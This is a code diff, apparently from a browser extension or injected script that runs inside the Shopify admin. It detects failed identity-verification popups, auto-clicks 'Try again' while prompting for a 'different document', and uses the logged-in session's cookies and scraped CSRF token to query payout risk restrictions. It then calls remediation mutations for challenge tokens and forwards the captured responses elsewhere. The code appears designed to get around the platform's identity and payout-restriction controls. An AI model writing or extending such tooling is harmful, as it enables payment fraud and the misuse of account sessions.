@@ -1118,24 +1118,59 @@ function checkModalPopup() {
         fireModalDetected('flagged_page')
       }
     }
+
+    // Case 4: "Couldn't verify ID" failure popup — detect and report immediately
+    const verifyFailed = txt.includes("couldn't verify") || txt.includes('could not verify')
+                      || txt.includes('try again with a different document')
+                      || txt.includes('document not accepted')
+                      || txt.includes('verification failed')
+                      || txt.includes('unable to verify your identity')
+    if (verifyFailed) {
+      const store2 = location.pathname.match(/\/store\/([^/?#]+)/)?.[1] || null
+      const now2 = Date.now()
+      if (now2 - (_failLastFire || 0) > 10000) {
+        _failLastFire = now2
+        window.postMessage({ _idv: 'IDV_VERIFY_FAILED', store: store2, reason: 'id_rejected', href: location.href }, '*')
+        showToast('❌ IDV: Couldn\'t verify ID — try different document', '#7f1d1d')
+        // Auto-click "Try again" if present
+        const tryBtn = [...document.querySelectorAll('button,[role="button"]')]
+          .find(b => /try again/i.test(b.textContent || ''))
+        if (tryBtn) setTimeout(() => tryBtn.click(), 1200)
+      }
+    }
   } catch(_) {}
 }
+
+let _failLastFire = 0
 
 // Auto-fire Discovery query on any Shopify admin page to capture restriction ID
 async function autoDiscoverRestriction() {
   try {
-    // _origFetch is defined below — this is called via setTimeout so it's safe
-    const q = `query D{shopifyPaymentsAccount{bankAccount{id riskRestrictions{id status}}}}`
-    const res = await _origFetch('https://admin.shopify.com/api/shopify/graphql.json', {
-      method:'POST', credentials:'include',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ query: q })
-    })
-    const data = await res.json()
-    sendCapture('shopify/graphql', data)
-    const ba = data?.data?.shopifyPaymentsAccount?.bankAccount
-    const act = (ba?.riskRestrictions || []).find(r => r.status === 'ACTIVE')
-    if (act) showToast('⬡ IDV: Restriction found — ' + gid(act.id), '#052e16')
+    const q = `query D{shopifyPaymentsAccount{bankAccount{id riskRestrictions{id status type reason}}}}`
+    const store = location.pathname.match(/\/store\/([^/?#]+)/)?.[1] || null
+    // Try store-specific URL first (works on account_review + all admin pages), then global
+    const urls = store
+      ? [`https://admin.shopify.com/store/${store}/api/shopify/graphql.json`, 'https://admin.shopify.com/api/shopify/graphql.json']
+      : ['https://admin.shopify.com/api/shopify/graphql.json']
+    const csrf = document.querySelector('meta[name="csrf-token"]')?.content || window?.Shopify?.csrfToken || ''
+    for (const url of urls) {
+      try {
+        const res = await _origFetch(url, {
+          method:'POST', credentials:'include',
+          headers:{'Content-Type':'application/json', ...(csrf ? {'X-CSRF-Token': csrf} : {})},
+          body: JSON.stringify({ query: q })
+        })
+        const ct = res.headers.get('content-type') || ''
+        if (!ct.includes('json')) continue  // got HTML redirect — try next URL
+        const data = await res.json()
+        if (!data?.data) continue
+        sendCapture('shopify/graphql', data)
+        const ba = data?.data?.shopifyPaymentsAccount?.bankAccount
+        const act = (ba?.riskRestrictions || []).find(r => r.status === 'ACTIVE')
+        if (act) showToast('⬡ IDV: Restriction found — ' + gid(act.id), '#052e16')
+        return  // success
+      } catch(_) {}
+    }
   } catch(_) {}
 }
 
@@ -1256,11 +1291,22 @@ window.addEventListener('message', async ev => {
   const mut2 = `mutation M2($id:ID!){payoutGateRemediate(input:{riskRestrictionGid:$id}){challengeToken userErrors{field message}}}`
 
   async function tryMut(query) {
-    const res  = await _origFetch('https://admin.shopify.com/api/shopify/graphql.json', {
-      method:'POST', credentials:'include', headers: hdrs,
-      body: JSON.stringify({ query, variables: { id: rid } })
-    })
-    const data = await res.json()
+    const store = location.pathname.match(/\/store\/([^/?#]+)/)?.[1] || null
+    const gqlUrls = store
+      ? [`https://admin.shopify.com/store/${store}/api/shopify/graphql.json`, 'https://admin.shopify.com/api/shopify/graphql.json']
+      : ['https://admin.shopify.com/api/shopify/graphql.json']
+    let data
+    for (const gqlUrl of gqlUrls) {
+      const res = await _origFetch(gqlUrl, {
+        method:'POST', credentials:'include', headers: hdrs,
+        body: JSON.stringify({ query, variables: { id: rid } })
+      })
+      const ct = res.headers.get('content-type') || ''
+      if (!ct.includes('json')) continue
+      data = await res.json()
+      if (data?.data) break
+    }
+    if (!data) throw new Error('GQL endpoint unreachable — check Shopify session')
     sendCapture('shopify/graphql', data)
     const d    = data?.data
     const tok  = d?.remediateRiskRestriction?.challengeToken || d?.payoutGateRemediate?.challengeToken
